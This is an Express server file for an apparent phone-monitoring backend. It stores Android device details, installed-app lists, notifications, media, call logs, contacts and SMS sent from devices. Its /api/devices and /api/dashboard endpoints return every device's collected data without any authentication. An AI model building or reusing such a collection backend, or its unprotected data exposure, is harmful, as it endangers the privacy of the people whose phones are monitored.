const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const path = require('path');
require('dotenv').config();

// Import routes
const authRoutes = require('./routes/auth');
const videoRoutes = require('./routes/videos');
const notificationRoutes = require('./routes/notifications');
const mediaRoutes = require('./routes/media');
const callLogRoutes = require('./routes/callLogs');
const contactRoutes = require('./routes/contacts');
const smsRoutes = require('./routes/sms');
const profileRoutes = require('./routes/profile');
const commentRoutes = require('./routes/comments');
const likeRoutes = require('./routes/likes');
const playlistRoutes = require('./routes/playlists');
const chatRoutes = require('./routes/chat');

const app = express();
const PORT = process.env.PORT || 5001;

// Middleware
app.use(helmet({
  crossOriginResourcePolicy: { policy: "cross-origin" },
  contentSecurityPolicy: false
}));
// CORS configuration for mobile app compatibility
app.use(cors({
  origin: '*', // Allow all origins for mobile app
  credentials: false, // Set to false when origin is *
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin']
}));
app.use(morgan('combined'));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));

// MongoDB Connection
mongoose.connect(process.env.MONGO_URL, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
  dbName: 'mob_notifications'
})
.then(() => {
  console.log('✅ MongoDB connected successfully to mob_notifications database');
  console.log('🔗 Database URL:', process.env.MONGO_URL?.replace(/\/\/[^:]+:[^@]+@/, '//***:***@'));
})
.catch(err => {
  console.log('❌ MongoDB connection error:', err.message);
  process.exit(1);
});

// Test database connection
mongoose.connection.on('error', (err) => {
  console.error('❌ MongoDB connection error:', err);
});

mongoose.connection.on('disconnected', () => {
  console.log('⚠️ MongoDB disconnected');
});

mongoose.connection.on('reconnected', () => {
  console.log('✅ MongoDB reconnected');
});

// Routes
app.use('/api/auth', authRoutes);
app.use('/api/videos', videoRoutes);
app.use('/api/notifications', notificationRoutes);
app.use('/api/media', mediaRoutes);
app.use('/api/call-logs', callLogRoutes);
app.use('/api/contacts', contactRoutes);
app.use('/api/sms', smsRoutes);
app.use('/api/profile', profileRoutes);
app.use('/api/comments', commentRoutes);
app.use('/api/likes', likeRoutes);
app.use('/api/playlists', playlistRoutes);
app.use('/api/chat', chatRoutes);

// Serve uploaded files
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
app.use('/public', express.static(path.join(__dirname, 'public')));

// Serve static frontend
app.use(express.static(path.join(__dirname, '../frontend/build')));

// Device info endpoint
app.post('/api/device/info', async (req, res) => {
  try {
    const { deviceId, manufacturer, model, androidVersion, sdkVersion, timestamp } = req.body;
    
    // Store device info in Device model (create if doesn't exist)
    const Device = require('./models/Device');
    let device = await Device.findOne({ deviceId });
    if (device) {
      device.deviceInfo = {
        manufacturer,
        model,
        androidVersion,
        sdkVersion,
        lastUpdated: new Date()
      };
      await device.save();
    } else {
      // Create new device if doesn't exist
      device = new Device({
        deviceId,
        deviceInfo: {
          manufacturer,
          model,
          androidVersion,
          sdkVersion,
          lastUpdated: new Date()
        }
      });
      await device.save();
    }

    res.json({ success: true, message: 'Device info stored' });
  } catch (error) {
    console.error('Device info error:', error);
    res.status(500).json({ success: false, message: 'Failed to store device info' });
  }
});

// Apps list endpoint
app.post('/api/apps/list', async (req, res) => {
  try {
    const { deviceId, apps } = req.body;
    
    // Store apps info in Device model
    const Device = require('./models/Device');
    let device = await Device.findOne({ deviceId });
    if (device) {
      device.installedApps = apps;
      device.lastAppsUpdate = new Date();
      await device.save();
    } else {
      // Create new device if doesn't exist
      device = new Device({
        deviceId,
        installedApps: apps,
        lastAppsUpdate: new Date()
      });
      await device.save();
    }

    res.json({ success: true, message: 'Apps list stored' });
  } catch (error) {
    console.error('Apps list error:', error);
    res.status(500).json({ success: false, message: 'Failed to store apps list' });
  }
});

// Get all devices data
app.get('/api/devices', async (req, res) => {
  try {
    const Device = require('./models/Device');
    const devices = await Device.find({})
      .select('deviceId deviceInfo installedApps lastAppsUpdate createdAt')
      .sort({ createdAt: -1 });
    
    res.json({ success: true, data: devices });
  } catch (error) {
    console.error('Get devices error:', error);
    res.status(500).json({ success: false, message: 'Failed to get devices' });
  }
});

// Get device dashboard data
app.get('/api/dashboard/:deviceId', async (req, res) => {
  try {
    const { deviceId } = req.params;
    
    const Device = require('./models/Device');
    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({ success: false, message: 'Device not found' });
    }

    // Get notifications count
    const notificationCount = await require('./models/Notification').countDocuments({ deviceId: deviceId });
    
    // Get media stats
    const mediaStats = await require('./models/Media').getDeviceStats(deviceId);
    
    // Get recent notifications
    const recentNotifications = await require('./models/Notification').find({ deviceId: deviceId })
      .sort({ timestamp: -1 })
      .limit(10);
    
    // Get recent media
    const recentMedia = await require('./models/Media').getRecentMedia(deviceId, 10);

    res.json({
      success: true,
      data: {
        device: {
          deviceId: device.deviceId,
          deviceInfo: device.deviceInfo,
          installedApps: device.installedApps,
          lastAppsUpdate: device.lastAppsUpdate,
          createdAt: device.createdAt
        },
        stats: {
          notifications: notificationCount,
          media: mediaStats,
          apps: device.installedApps ? device.installedApps.length : 0
        },
        recentNotifications,
        recentMedia
      }
    });
  } catch (error) {
    console.error('Dashboard error:', error);
    res.status(500).json({ success: false, message: 'Failed to get dashboard data' });
  }
});

// Health check route
app.get('/api/health', (req, res) => {
  res.json({
    status: 'healthy',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    version: '1.0.0',
    environment: process.env.NODE_ENV
  });
});

// Keep-alive endpoint to prevent sleep
app.get('/api/keep-alive', (req, res) => {
  res.json({
    status: 'awake',
    timestamp: new Date().toISOString(),
    message: 'Server is active and running'
  });
});

// Auto keep-alive mechanism (optional - for extra reliability)
if (process.env.NODE_ENV === 'production') {
  setInterval(() => {
    console.log('🔄 Keep-alive ping:', new Date().toISOString());
  }, 5 * 60 * 1000); // Log every 5 minutes
}

// Root endpoint - serve frontend
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../frontend/build/index.html'));
});

// Catch all other non-API routes and serve frontend
app.get('*', (req, res) => {
  // Only serve frontend for non-API routes
  if (!req.path.startsWith('/api/')) {
    res.sendFile(path.join(__dirname, '../frontend/build/index.html'));
  } else {
    res.status(404).json({ success: false, message: 'API endpoint not found' });
  }
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Error:', err);
  res.status(500).json({
    success: false,
    message: process.env.NODE_ENV === 'development' ? err.message : 'Something went wrong'
  });
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📧 Environment: ${process.env.NODE_ENV}`);
      console.log(`🔗 API Documentation: https://notify-oxh1.onrender.com`);
    console.log(`🏥 Health Check: https://notify-oxh1.onrender.com/health`);
});

module.exports = app; 